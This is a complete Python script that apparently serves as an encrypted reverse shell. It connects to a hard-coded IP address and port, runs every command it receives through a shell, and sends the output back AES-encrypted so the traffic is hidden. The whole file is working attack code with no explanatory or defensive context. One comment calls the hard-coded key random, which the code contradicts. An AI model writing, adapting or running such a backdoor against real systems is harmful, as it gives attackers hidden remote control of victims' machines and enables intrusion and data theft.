#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess,socket
import base64
import os

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# the character used for padding--with a block cipher such as AES, the value
# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
# used to ensure that your value is always a multiple of BLOCK_SIZE
PADDING = '{'

# one-liner to sufficiently pad the text to be encrypted
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# create a cipher object using the random secret
iv = os.urandom(16)
cipher = AES.new(secret,AES.MODE_CFB,iv)
HOST = '172.16.69.139'
PORT = 4443

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((HOST, PORT))
#s.send('Hello There!\n')

success = EncodeAES(cipher, 'Success! We made it!EOFEOFEOFEOFEOFX')
s.send(success)

while 1:
	# this data is now encrypted
	data = s.recv(1024)
	
	# decrypt data
	decrypted = DecodeAES(cipher, data)
	
	# check for quit
	if decrypted == "quit":
		break
		
	# execute command
	proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	
	# save output/error
	stdoutput = proc.stdout.read() + proc.stderr.read()
	
	# encrypt output
	encrypted = EncodeAES(cipher, stdoutput)
	
	# send encrypted output
	s.send(encrypted)

# loop ends here
# s.send('Bye now!')
s.close()
